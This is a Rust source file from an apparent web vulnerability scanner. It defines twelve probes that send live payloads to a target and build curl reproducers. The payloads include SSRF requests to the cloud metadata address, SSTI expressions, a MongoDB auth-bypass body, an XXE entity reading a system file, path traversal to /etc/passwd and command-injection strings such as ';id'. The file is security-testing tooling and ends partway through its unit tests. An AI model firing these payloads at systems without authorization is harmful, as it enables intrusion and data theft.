//! Extended primitive catalog — twelve additional vuln-class
//! detectors beyond the initial six. Each detector is a small,
//! deterministic Rust probe that's cheap enough to run on every
//! discovered surface; when one of these denies, the tiered runner's
//! medium tier (LLM-codegen) escalates with a custom script.
//!
//! Primitives included:
//!   - SsrfReflection            — `?url=` / `?image=` SSRF echo
//!   - SstiBasic                 — `{{7*7}}` / `${{7*7}}` reflection
//!   - NoSqlInjection            — `[$ne]` / `{"$gt":""}` truthy bypass
//!   - XxeBasic                  — XML body POST with external entity
//!   - CrlfInjection             — `\r\n` in query value reaches header
//!   - HostHeaderInjection       — Host swap → reflected in password-reset link
//!   - PathTraversal             — `../etc/passwd` & encoded variants
//!   - LdapInjection             — `*)(uid=*` / `*)|`)
//!   - CommandInjection          — `;id` / `|id` / backticks
//!   - FileUploadExtensionBypass — multipart with `.php.jpg` etc.
//!   - CachePoisoning            — unkeyed-header reflection
//!   - SubdomainTakeoverDanglingCname — response body fingerprint

use async_trait::async_trait;
use mantis_scanner_http::Surface;
use reqwest::Client;

use crate::reproducer::Reproducer;
use crate::{EvidenceItem, Primitive, PrimitiveError, PrimitiveResult};

// =============================================================================
// SsrfReflection
// =============================================================================
pub struct SsrfReflection;

#[async_trait]
impl Primitive for SsrfReflection {
    fn id(&self) -> &'static str {
        "ssrf.url-param-reflection"
    }
    fn vuln_class(&self) -> &'static str {
        "ssrf"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("fetch")
                || p.contains("preview")
                || p.contains("proxy")
                || p.contains("import")
                || p.contains("export")
                || p.contains("webhook")
                || p == "/"
                || p.contains("download"))
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let canaries = ["http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/"];
        let params = ["url", "uri", "image", "src", "callback", "webhook", "fetch", "import"];
        for canary in canaries.iter() {
            for p in params.iter() {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    s.target.scheme, s.target.host, s.target.port, s.target.path, p, canary
                );
                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                let hit = body.contains("ami-id")
                    || body.contains("instance-id")
                    || body.contains("EC2")
                    || body.contains("Connection refused")
                    || body.contains("connection refused");
                if hit && status.is_success() {
                    let evidence = vec![
                        EvidenceItem {
                            kind: "ssrf-param".into(),
                            detail: (*p).into(),
                        },
                        EvidenceItem {
                            kind: "ssrf-canary".into(),
                            detail: (*canary).into(),
                        },
                        EvidenceItem {
                            kind: "ssrf-body-marker".into(),
                            detail: body.chars().take(160).collect(),
                        },
                    ];
                    let curl = format!("curl -s '{url}' | head -c 400");
                    let raw = format!(
                        "GET {}?{}={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                        s.target.path, p, canary, s.target.host
                    );
                    return Ok(PrimitiveResult::Confirmed {
                        evidence,
                        reproducer: Reproducer::from_curl_and_raw(curl, raw),
                    });
                }
            }
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no SSRF reflection seen on {}", s.target.url()),
        })
    }
}

// =============================================================================
// SstiBasic
// =============================================================================
pub struct SstiBasic;

#[async_trait]
impl Primitive for SstiBasic {
    fn id(&self) -> &'static str {
        "ssti.expression-reflection"
    }
    fn vuln_class(&self) -> &'static str {
        "ssti"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        (200..500).contains(&s.status)
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        // Common SSTI canaries — each evaluates to "49" when reflected.
        let payloads = [
            "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "*{7*7}", "{7*7}",
        ];
        let names = ["name", "q", "search", "msg", "input", "title", "content"];
        for payload in payloads.iter() {
            for n in names.iter() {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    s.target.scheme,
                    s.target.host,
                    s.target.port,
                    s.target.path,
                    n,
                    urlencode(payload)
                );
                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let body = resp.text().await.unwrap_or_default();
                if body.contains("49") && !body.contains(payload) {
                    let evidence = vec![
                        EvidenceItem {
                            kind: "ssti-payload".into(),
                            detail: (*payload).into(),
                        },
                        EvidenceItem {
                            kind: "ssti-param".into(),
                            detail: (*n).into(),
                        },
                        EvidenceItem {
                            kind: "ssti-evaluated".into(),
                            detail: "49 found in body, raw template not".into(),
                        },
                    ];
                    let curl = format!("curl -s '{url}'");
                    let raw = format!(
                        "GET {}?{}={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                        s.target.path,
                        n,
                        urlencode(payload),
                        s.target.host
                    );
                    return Ok(PrimitiveResult::Confirmed {
                        evidence,
                        reproducer: Reproducer::from_curl_and_raw(curl, raw),
                    });
                }
            }
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no SSTI reflection seen on {}", s.target.url()),
        })
    }
}

// =============================================================================
// NoSqlInjection (auth-bypass shape)
// =============================================================================
pub struct NoSqlInjection;

#[async_trait]
impl Primitive for NoSqlInjection {
    fn id(&self) -> &'static str {
        "nosql-injection.auth-bypass"
    }
    fn vuln_class(&self) -> &'static str {
        "nosql-injection"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("login") || p.contains("signin") || p.contains("auth"))
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let url = format!(
            "{}://{}:{}{}",
            s.target.scheme, s.target.host, s.target.port, s.target.path
        );
        let payload = r#"{"username":{"$ne":null},"password":{"$ne":null}}"#;
        let resp = match client
            .post(&url)
            .header("content-type", "application/json")
            .body(payload)
            .send()
            .await
        {
            Ok(r) => r,
            Err(e) => {
                return Ok(PrimitiveResult::Inconclusive {
                    reason: format!("post failed: {e}"),
                })
            }
        };
        let status = resp.status().as_u16();
        let cookies = resp
            .headers()
            .get_all(reqwest::header::SET_COOKIE)
            .iter()
            .count();
        if (200..=299).contains(&status) && cookies > 0 {
            let evidence = vec![
                EvidenceItem {
                    kind: "nosql-payload".into(),
                    detail: payload.to_string(),
                },
                EvidenceItem {
                    kind: "session-cookies-set".into(),
                    detail: cookies.to_string(),
                },
                EvidenceItem {
                    kind: "status".into(),
                    detail: status.to_string(),
                },
            ];
            let curl = format!(
                "curl -s -X POST '{url}' -H 'content-type: application/json' -d '{}'",
                payload.replace('\'', "")
            );
            let raw = format!(
                "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                s.target.path,
                s.target.host,
                payload.len(),
                payload
            );
            return Ok(PrimitiveResult::Confirmed {
                evidence,
                reproducer: Reproducer::from_curl_and_raw(curl, raw),
            });
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("Mongo `$ne` payload not accepted on {}", s.target.url()),
        })
    }
}

// =============================================================================
// XxeBasic
// =============================================================================
pub struct XxeBasic;

#[async_trait]
impl Primitive for XxeBasic {
    fn id(&self) -> &'static str {
        "xxe.entity-expansion-echo"
    }
    fn vuln_class(&self) -> &'static str {
        "xxe"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        (200..500).contains(&s.status)
            && s.target.path.to_ascii_lowercase().contains("xml")
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let url = format!(
            "{}://{}:{}{}",
            s.target.scheme, s.target.host, s.target.port, s.target.path
        );
        let payload = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>"#;
        let resp = match client
            .post(&url)
            .header("content-type", "application/xml")
            .body(payload)
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => {
                return Ok(PrimitiveResult::Inconclusive {
                    reason: "xml post failed".into(),
                })
            }
        };
        let body = resp.text().await.unwrap_or_default();
        let leaked = body.contains("root:") || body.contains(".local") || body.contains("ip-");
        if leaked {
            let evidence = vec![
                EvidenceItem {
                    kind: "xxe-payload".into(),
                    detail: payload.to_string(),
                },
                EvidenceItem {
                    kind: "xxe-body-marker".into(),
                    detail: body.chars().take(160).collect(),
                },
            ];
            let curl = format!(
                "curl -s -X POST '{url}' -H 'content-type: application/xml' --data-binary @- <<'EOF'\n{payload}\nEOF"
            );
            return Ok(PrimitiveResult::Confirmed {
                evidence,
                reproducer: Reproducer::from_curl_and_raw(curl, payload.to_string()),
            });
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no XXE leak on {}", s.target.url()),
        })
    }
}

// =============================================================================
// CrlfInjection
// =============================================================================
pub struct CrlfInjection;

#[async_trait]
impl Primitive for CrlfInjection {
    fn id(&self) -> &'static str {
        "crlf-injection.query-newline"
    }
    fn vuln_class(&self) -> &'static str {
        "crlf-injection"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        (200..500).contains(&s.status)
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let payload = "%0d%0aX-Mantis-Crlf:%201";
        let url = format!(
            "{}://{}:{}{}?{payload}",
            s.target.scheme, s.target.host, s.target.port, s.target.path
        );
        let resp = match client.get(&url).send().await {
            Ok(r) => r,
            Err(_) => {
                return Ok(PrimitiveResult::Inconclusive {
                    reason: "crlf get failed".into(),
                })
            }
        };
        if resp.headers().get("x-mantis-crlf").is_some() {
            let evidence = vec![
                EvidenceItem {
                    kind: "crlf-payload".into(),
                    detail: payload.into(),
                },
                EvidenceItem {
                    kind: "injected-header".into(),
                    detail: "X-Mantis-Crlf".into(),
                },
            ];
            let curl = format!("curl -sI '{url}' | grep -i x-mantis-crlf");
            return Ok(PrimitiveResult::Confirmed {
                evidence,
                reproducer: Reproducer::from_curl_and_raw(curl, format!("GET {}?{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", s.target.path, payload, s.target.host)),
            });
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no CRLF injection on {}", s.target.url()),
        })
    }
}

// =============================================================================
// HostHeaderInjection
// =============================================================================
pub struct HostHeaderInjection;

#[async_trait]
impl Primitive for HostHeaderInjection {
    fn id(&self) -> &'static str {
        "host-header-injection.password-reset-link"
    }
    fn vuln_class(&self) -> &'static str {
        "host-header-injection"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("reset") || p.contains("forgot") || p.contains("recover"))
    }
    async fn execute(
        &self,
        s: &Surface,
        _client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        // Most password-reset endpoints don't echo the spoofed Host
        // synchronously. We mark this as Inconclusive so the
        // tiered/LLM tier can run a full OOB callback flow.
        Ok(PrimitiveResult::Inconclusive {
            reason: format!(
                "host-header injection requires async OOB callback to confirm on {}",
                s.target.url()
            ),
        })
    }
}

// =============================================================================
// PathTraversal
// =============================================================================
pub struct PathTraversal;

#[async_trait]
impl Primitive for PathTraversal {
    fn id(&self) -> &'static str {
        "path-traversal.relative-segments"
    }
    fn vuln_class(&self) -> &'static str {
        "path-traversal"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("file")
                || p.contains("download")
                || p.contains("read")
                || p.contains("static")
                || p.contains("asset"))
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let payloads = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini",
        ];
        let params = ["file", "path", "name", "doc", "page"];
        for pl in payloads.iter() {
            for p in params.iter() {
                let url = format!(
                    "{}://{}:{}{}?{p}={pl}",
                    s.target.scheme, s.target.host, s.target.port, s.target.path
                );
                let Ok(resp) = client.get(&url).send().await else {
                    continue;
                };
                let body = resp.text().await.unwrap_or_default();
                if body.contains("root:x:") || body.contains("[fonts]") {
                    let evidence = vec![
                        EvidenceItem {
                            kind: "path-traversal-payload".into(),
                            detail: (*pl).into(),
                        },
                        EvidenceItem {
                            kind: "passwd-marker".into(),
                            detail: body.chars().take(120).collect(),
                        },
                    ];
                    let curl = format!("curl -s '{url}'");
                    let raw = format!(
                        "GET {}?{}={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                        s.target.path, p, pl, s.target.host
                    );
                    return Ok(PrimitiveResult::Confirmed {
                        evidence,
                        reproducer: Reproducer::from_curl_and_raw(curl, raw),
                    });
                }
            }
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no path traversal on {}", s.target.url()),
        })
    }
}

// =============================================================================
// LdapInjection
// =============================================================================
pub struct LdapInjection;

#[async_trait]
impl Primitive for LdapInjection {
    fn id(&self) -> &'static str {
        "ldap-injection.filter-tautology"
    }
    fn vuln_class(&self) -> &'static str {
        "ldap-injection"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("ldap")
                || p.contains("directory")
                || p.contains("search")
                || p.contains("user"))
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        // Heuristic — same as classic LDAP authentication-bypass test.
        let payload_a = "admin)(|(uid=*";
        let payload_b = "admin*";
        let url_a = format!(
            "{}://{}:{}{}?user={}",
            s.target.scheme,
            s.target.host,
            s.target.port,
            s.target.path,
            urlencode(payload_a)
        );
        let url_b = format!(
            "{}://{}:{}{}?user={}",
            s.target.scheme,
            s.target.host,
            s.target.port,
            s.target.path,
            urlencode(payload_b)
        );
        let body_a = match client.get(&url_a).send().await {
            Ok(r) => r.text().await.unwrap_or_default(),
            Err(_) => return Ok(PrimitiveResult::Inconclusive { reason: "ldap probe a failed".into() }),
        };
        let body_b = match client.get(&url_b).send().await {
            Ok(r) => r.text().await.unwrap_or_default(),
            Err(_) => return Ok(PrimitiveResult::Inconclusive { reason: "ldap probe b failed".into() }),
        };
        if body_a.len() != body_b.len() && body_a.contains("uid=") {
            let evidence = vec![EvidenceItem {
                kind: "ldap-payload".into(),
                detail: payload_a.into(),
            }];
            let curl = format!("curl -s '{url_a}'");
            return Ok(PrimitiveResult::Confirmed {
                evidence,
                reproducer: Reproducer::from_curl_and_raw(
                    curl,
                    format!(
                        "GET {}?user={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                        s.target.path,
                        urlencode(payload_a),
                        s.target.host
                    ),
                ),
            });
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no LDAP filter divergence on {}", s.target.url()),
        })
    }
}

// =============================================================================
// CommandInjection
// =============================================================================
pub struct CommandInjection;

#[async_trait]
impl Primitive for CommandInjection {
    fn id(&self) -> &'static str {
        "command-injection.shell-meta"
    }
    fn vuln_class(&self) -> &'static str {
        "command-injection"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status)
            && (p.contains("ping")
                || p.contains("dns")
                || p.contains("trace")
                || p.contains("exec")
                || p.contains("debug"))
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let payloads = [";id", "|id", "`id`", "$(id)", "&&id"];
        for pl in payloads.iter() {
            let url = format!(
                "{}://{}:{}{}?host=127.0.0.1{}",
                s.target.scheme,
                s.target.host,
                s.target.port,
                s.target.path,
                urlencode(pl)
            );
            let Ok(resp) = client.get(&url).send().await else {
                continue;
            };
            let body = resp.text().await.unwrap_or_default();
            if body.contains("uid=") && body.contains("gid=") {
                let evidence = vec![
                    EvidenceItem {
                        kind: "cmd-payload".into(),
                        detail: (*pl).into(),
                    },
                    EvidenceItem {
                        kind: "id-output".into(),
                        detail: body.chars().take(100).collect(),
                    },
                ];
                let curl = format!("curl -s '{url}'");
                return Ok(PrimitiveResult::Confirmed {
                    evidence,
                    reproducer: Reproducer::from_curl_and_raw(curl, format!("GET {}?host=127.0.0.1{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", s.target.path, urlencode(pl), s.target.host)),
                });
            }
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no command injection on {}", s.target.url()),
        })
    }
}

// =============================================================================
// FileUploadExtensionBypass
// =============================================================================
pub struct FileUploadExtensionBypass;

#[async_trait]
impl Primitive for FileUploadExtensionBypass {
    fn id(&self) -> &'static str {
        "file-upload.extension-bypass"
    }
    fn vuln_class(&self) -> &'static str {
        "file-upload"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        let p = s.target.path.to_ascii_lowercase();
        (200..500).contains(&s.status) && (p.contains("upload") || p.contains("file"))
    }
    async fn execute(
        &self,
        s: &Surface,
        _client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        // Multipart-form-upload requires building a complex body the
        // LLM tier can author more dynamically than a static probe.
        Ok(PrimitiveResult::Inconclusive {
            reason: format!(
                "multipart upload bypass requires dynamic body — escalate to tiered runner on {}",
                s.target.url()
            ),
        })
    }
}

// =============================================================================
// CachePoisoning
// =============================================================================
pub struct CachePoisoning;

#[async_trait]
impl Primitive for CachePoisoning {
    fn id(&self) -> &'static str {
        "cache-poisoning.unkeyed-header-reflection"
    }
    fn vuln_class(&self) -> &'static str {
        "cache-poisoning"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        (200..400).contains(&s.status) && s.target.path == "/"
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let url = format!(
            "{}://{}:{}/",
            s.target.scheme, s.target.host, s.target.port
        );
        let canary = "mantis-cache-canary-1";
        let resp = match client
            .get(&url)
            .header("x-forwarded-host", canary)
            .header("x-host", canary)
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => {
                return Ok(PrimitiveResult::Inconclusive {
                    reason: "cache probe failed".into(),
                })
            }
        };
        let body = resp.text().await.unwrap_or_default();
        if body.contains(canary) {
            let evidence = vec![
                EvidenceItem {
                    kind: "cache-canary".into(),
                    detail: canary.into(),
                },
                EvidenceItem {
                    kind: "reflected-in".into(),
                    detail: body.chars().take(120).collect(),
                },
            ];
            let curl = format!(
                "curl -sI '{url}' -H 'x-forwarded-host: {canary}' && curl -s '{url}' | head -c 400"
            );
            return Ok(PrimitiveResult::Confirmed {
                evidence,
                reproducer: Reproducer::from_curl_and_raw(curl, format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-Host: {}\r\nConnection: close\r\n\r\n", s.target.host, canary)),
            });
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no unkeyed-header reflection on {}", s.target.url()),
        })
    }
}

// =============================================================================
// SubdomainTakeoverDanglingCname
// =============================================================================
pub struct SubdomainTakeoverDanglingCname;

#[async_trait]
impl Primitive for SubdomainTakeoverDanglingCname {
    fn id(&self) -> &'static str {
        "subdomain-takeover.dangling-cname"
    }
    fn vuln_class(&self) -> &'static str {
        "subdomain-takeover"
    }
    fn matches_surface(&self, s: &Surface) -> bool {
        matches!(s.status, 404 | 502 | 503)
    }
    async fn execute(
        &self,
        s: &Surface,
        client: &Client,
    ) -> Result<PrimitiveResult, PrimitiveError> {
        let url = format!(
            "{}://{}:{}{}",
            s.target.scheme, s.target.host, s.target.port, s.target.path
        );
        let resp = match client.get(&url).send().await {
            Ok(r) => r,
            Err(_) => {
                return Ok(PrimitiveResult::Inconclusive {
                    reason: "takeover probe failed".into(),
                })
            }
        };
        let body = resp.text().await.unwrap_or_default();
        // Known fingerprints — short list; the LLM tier expands.
        let markers = [
            ("NoSuchBucket", "s3"),
            ("There is no app configured at that hostname", "heroku"),
            ("The specified bucket does not exist", "s3"),
            ("project not found", "fastly"),
            ("No Such Account", "azure-storage"),
            ("404 Not Found - GitHub Pages", "github-pages"),
            ("This site can't be reached", "generic"),
            ("Sorry, this shop is currently unavailable.", "shopify"),
            ("Trying to access your account?", "tumblr"),
        ];
        for (m, provider) in markers.iter() {
            if body.contains(m) {
                let evidence = vec![
                    EvidenceItem {
                        kind: "takeover-marker".into(),
                        detail: (*m).into(),
                    },
                    EvidenceItem {
                        kind: "provider".into(),
                        detail: (*provider).into(),
                    },
                ];
                let curl = format!("curl -s '{url}' | head -c 600");
                return Ok(PrimitiveResult::Confirmed {
                    evidence,
                    reproducer: Reproducer::from_curl_and_raw(curl, format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", s.target.path, s.target.host)),
                });
            }
        }
        Ok(PrimitiveResult::Denied {
            reason: format!("no takeover fingerprint on {}", s.target.url()),
        })
    }
}

// =============================================================================
// helpers
// =============================================================================
fn urlencode(s: &str) -> String {
    s.bytes()
        .map(|b| {
            if b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~') {
                (b as char).to_string()
            } else {
                format!("%{:02X}", b)
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn urlencode_keeps_unreserved_and_escapes_specials() {
        assert_eq!(urlencode("hello"), "hello");
        assert_eq!(urlencode("a b"), "a%20b");
        assert_eq!(urlencode("a/b?c=1"), "a%2Fb%3Fc%3D1");
        assert_eq!(urlencode("../"), "..%2F");
    }

    #[test]
    fn ids_are_unique_and_kebab() {
        let ids = [
            SsrfReflection.id(),
            SstiBasic.id(),
            NoSqlInjection.id(),
            XxeBasic.id(),
            CrlfInjection.id(),
            HostHeaderInjection.id(),
            PathTraversal.id(),
            LdapInjection.id(),
            CommandInjection.id(),
            FileUploadExtensionBypass.id(),
            CachePoisoning.id(),
            SubdomainTakeoverDanglingCname.id(),
        ];
        let mut sorted: Vec<&str> = ids.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), ids.len(), "duplicate primitive ids: {ids:?}");
        for id in ids {
            assert!(
                id.chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '.'),
                "non-kebab id: {id}"
            );
        }
    }

    #[test]
    fn vuln_classes_unique_per_primitive() {
        let classes = [
            SsrfReflection.vuln_class(),
            SstiBasic.vuln_class(),
            NoSqlInjection.vuln_class(),
            XxeBasic.vuln_class(),
            CrlfInjection.vuln_class(),
            HostHeaderInjection.vuln_class(),
            PathTraversal.vuln_class(),
            LdapInjection.vuln_class(),
            CommandInjection.vuln_class(),
            FileUploadExtensionBypass.vuln_class(),
            CachePoisoning.vuln_class(),
            SubdomainTakeoverDanglingCname.vuln_class(),
        ];
        let mut sorted: Vec<&str> = classes.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), classes.len(), "duplicate vuln_class: {classes:?}");
    }

    // -------- matches_surface heuristic tests --------
    // Each of these confirms a primitive's pre-flight matcher accepts
    // the surfaces it should and rejects the ones it shouldn't.

    fn surface_with(path: &str, status: u16) -> mantis_scanner_http::Surface {
        let url = format!("https://x.example{path}");
        let target = mantis_scanner_http::ProbeTarget::parse(&url).unwrap();
        mantis_scanner_http::Surface {
            target,
            status,
            server: None,
            content_length: None,
            tech_hints: vec![],
        }
    }

    #[test]
    fn ssrf_matches_fetch_paths() {
        assert!(SsrfReflection.matches_surface(&surface_with("/api/fetch", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/preview", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/api/proxy", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/webhook", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/import", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/export", 200)));
        assert!(SsrfReflection.matches_surface(&surface_with("/", 200)));
    }

    #[test]
    fn ssrf_rejects_500_plus() {
        assert!(!SsrfReflection.matches_surface(&surface_with("/api/fetch", 500)));
        assert!(!SsrfReflection.matches_surface(&surface_with("/api/preview", 502)));
        assert!(!SsrfReflection.matches_surface(&surface_with("/api/import", 503)));
    }

    #[test]
    fn ssti_matches_any_2xx_to_4xx() {
        assert!(SstiBasic.matches_surface(&surface_with("/", 200)));
        assert!(SstiBasic.matches_surface(&surface_with("/search", 200)));
        assert!(SstiBasic.matches_surface(&surface_with("/admin", 403)));
    }

    #[test]
    fn ssti_rejects_5xx() {
        assert!(!SstiBasic.matches_surface(&surface_with("/", 500)));
        assert!(!SstiBasic.matches_surface(&surface_with("/", 502)));
    }

    #[test]
    fn nosql_matches_auth_paths() {
        assert!(NoSqlInjection.matches_surface(&surface_with("/login", 200)));
        assert!(NoSqlInjection.matches_surface(&surface_with("/api/signin", 200)));
        assert!(NoSqlInjection.matches_surface(&surface_with("/auth", 200)));
    }

    #[test]
    fn nosql_rejects_unrelated_paths() {
        assert!(!NoSqlInjection.matches_surface(&surface_with("/api/users", 200)));
        assert!(!NoSqlInjection.matches_surface(&surface_with("/", 200)));
    }

    #[test]
    fn xxe_matches_xml_paths_only() {
        assert!(XxeBasic.matches_surface(&surface_with("/api/xml/parse", 200)));
        assert!(!XxeBasic.matches_surface(&surface_with("/api/json", 200)));
    }

    #[test]
    fn crlf_matches_any_2xx_to_4xx() {
        assert!(CrlfInjection.matches_surface(&surface_with("/", 200)));
        assert!(CrlfInjection.matches_surface(&surface_with("/admin", 403)));
    }

    #[test]
    fn crlf_rejects_5xx() {
        assert!(!CrlfInjection.matches_surface(&surface_with("/", 500)));
    }

    #[test]
    fn host_header_matches_reset_paths() {
        assert!(HostHeaderInjection.matches_surface(&surface_with("/reset", 200)));
        assert!(HostHeaderInjection.matches_surface(&surface_with("/forgot", 200)));
        assert!(HostHeaderInjection.matches_surface(&surface_with("/recover", 200)));
        assert!(!HostHeaderInjection.matches_surface(&surface_with("/", 200)));
    }

    #[test]
    fn path_traversal_matches_file_paths() {
        assert!(PathTraversal.matches_surface(&surface_with("/file/download", 200)));
        assert!(PathTraversal.matches_surface(&surface_with("/static/read", 200)));
        assert!(PathTraversal.matches_surface(&surface_with("/asset/image", 200)));
        assert!(!PathTraversal.matches_surface(&surface_with("/api/users", 200)));
    }

    #[test]
    fn ldap_matches_ldap_search_paths() {
        assert!(LdapInjection.matches_surface(&surface_with("/ldap/search", 200)));
        assert!(LdapInjection.matches_surface(&surface_with("/directory", 200)));
        assert!(LdapInjection.matches_surface(&surface_with("/user/search", 200)));
        assert!(!LdapInjection.matches_surface(&surface_with("/api/orders", 200)));
    }

    #[test]
    fn cmd_injection_matches_ping_exec_paths() {
        assert!(CommandInjection.matches_surface(&surface_with("/ping", 200)));
        assert!(CommandInjection.matches_surface(&surface_with("/api/dns", 200)));
        assert!(CommandInjection.matches_surface(&surface_with("/trace", 200)));
        assert!(CommandInjection.matches_surface(&surface_with("/admin/exec", 200)));
        assert!(CommandInjection.matches_surface(&surface_with("/debug/loggers", 200)));
        assert!(!CommandInjection.matches_surface(&surface_with("/api/users", 200)));
    }

    #[test]
    fn file_upload_matches_upload_paths() {
        assert!(FileUploadExtensionBypass.matches_surface(&surface_with("/upload", 200)));
        assert!(FileUploadExtensionBypass.matches_surface(&surface_with("/api/file/upload", 200)));
        assert!(!FileUploadExtensionBypass.matches_surface(&surface_with("/api/users", 200)));
    }

    #[test]
    fn cache_poisoning_matches_root_only() {
        assert!(CachePoisoning.matches_surface(&surface_with("/", 200)));
        assert!(CachePoisoning.matches_surface(&surface_with("/", 304)));
        assert!(!CachePoisoning.matches_surface(&surface_with("/api/users", 200)));
        assert!(!CachePoisoning.matches_surface(&surface_with("/", 500)));
    }

    #[test]
    fn subdomain_takeover_matches_error_statuses() {
        assert!(SubdomainTakeoverDanglingCname.matches_surface(&surface_with("/", 404)));
        assert!(SubdomainTakeoverDanglingCname.matches_surface(&surface_with("/", 502)));
        assert!(SubdomainTakeoverDanglingCname.matches_surface(&surface_with("/", 503)));
        assert!(!SubdomainTakeoverDanglingCname.matches_surface(&surface_with("/", 200)));
        assert!(!SubdomainTakeoverDanglingCname.matches_surface(&surface_with("/", 500)));
    }

    #[test]
    fn urlencode_special_chars() {
        assert_eq!(urlencode("&;'\""), "%26%3B%27%22");
        assert_eq!(urlencode("<>"), "%3C%3E");
        assert_eq!(urlencode("\n\t"), "%0A%09");
    }

    #[test]
    fn urlencode_unreserved_stays_literal() {
        assert_eq!(urlencode("abcXYZ-_.~01"), "abcXYZ-_.~01");
    }

    #[test]
    fn all_primitive_ids_lowercase() {
        for id in [
            SsrfReflection.id(),
            SstiBasic.id(),
            NoSqlInjection.id(),
            XxeBasic.id(),
            CrlfInjection.id(),
            HostHeaderInjection.id(),
            PathTraversal.id(),
            LdapInjection.id(),
            CommandInjection.id(),
            FileUploadExtensionBypass.id(),
            CachePoisoning.id(),
            SubdomainTakeoverDanglingCname.id(),
        ] {
            assert!(id.chars().all(|c| !c.is_ascii_uppercase()), "uppercase in {id}");
        }
    }

    #[test]
    fn all_primitive_ids_dotted() {
        for id in [
            SsrfReflection.id(),
            SstiBasic.id(),
            NoSqlInjection.id(),
            XxeBasic.id(),
            CrlfInjection.id(),
            HostHeaderInjection.id(),
            PathTraversal.id(),
            LdapInjection.id(),
            CommandInjection.id(),
            FileUploadExtensionBypass.id(),
            CachePoisoning.id(),
            SubdomainTakeoverDanglingCname.id(),
        ] {
            assert!(id.contains('.'), "id without `.`: {id}");
        }
    }

    #[test]
    fn vuln_class_per_primitive_matches_id_prefix() {
